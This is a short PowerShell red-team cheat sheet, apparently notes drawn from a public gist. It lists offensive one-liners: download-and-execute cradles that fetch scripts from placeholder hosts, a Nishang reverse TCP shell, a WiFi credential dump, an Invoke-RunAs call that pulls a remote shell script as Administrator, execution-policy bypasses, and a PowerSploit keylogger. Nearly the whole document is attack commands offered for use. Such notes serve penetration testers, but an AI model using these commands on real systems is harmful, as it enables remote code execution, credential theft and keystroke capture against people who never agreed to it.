# PowerShell

[RedTeam_CheatSheet.ps1 · GitHub](https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70)

## Basic commands

### download file

```powershell
IEX(New-Object Net.WebClient).downloadString('<url>')`
```
or
```powershell
IEX(IWR('<url>'))
```

### Get-Content (like type / cat)

```powershell
Get-Content <file>
```

### Check architecture

```powershell
[environment]::Is64OperatingSystem
[environment]::Is64BitProcess
```

64bit PowerShell path
```powershell
C:\Windows\SysNative\WindowsPowerShell\v1.0\PowerShell
```

### whoami

```powershell
whoami /all
```
-> SeImpersonatePrivilege (RottenTomato)

### Base64 encode file

```powershell
$fc = Get-Content "filename"
$fe = [System.Text.Encoding]::UTF8.GetBytes($fc)
[System.Convert]::ToBase64String($fe)
```

## Nishang

> Offensive PowerShell for red team, penetration testing and offensive security.  
[GitHub - samratashok/nishang](https://github.com/samratashok/nishang)

Gather information
```powershell
powershell -ExecutionPolicy bypass -file Get-Information.ps1 > results.txt
```

Get wifi creds
```powershell
.\Get-WLAN-Keys.ps1
```

**Reverse shell**
```powershell
/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
```
-> Append `Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port <port>` to `Invoke-PowerShellTcp.ps1` to automatically execute the shell

**Remote execution**
```powershell
powershell IEX (New-Object System.Net.WebClient).DownloadString('http://<ip>/Invoke-PowerShellTcp.ps1')
```

```powershell
powershell -NoProfile -ExecutionPolicy unrestricted -Command IEX (New-Object System.Net.WebClient).DownloadString('http://<ip>/Invoke-PowerShellTcp.ps1')
```

## PowerShell-Suite

> This is a collection of PowerShell utilities I put together either for fun or because I had a narrow application in mind.  
[GitHub - FuzzySecurity/PowerShell-Suite](https://github.com/FuzzySecurity/PowerShell-Suite)

```powershell
Invoke-RunAs.ps1 
```

```powershell
Invoke-RunAs -User Administrator -Password <pw> -LogonType 0x1 -Binary c:\Windows\SysNative\WindowsPowerShell\v1.0\PowerShell.exe -Args "IEX(New-Object Net.WebClient).downloadString('http://<ip>/shell.ps1')"
```
-> Put at the bottom of Invoke-RunAs.ps1, if not working otherwise

## Keylogger

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1)
Get-Keystrokes -LogPath C:\key.log -CollectionInterval 1
```
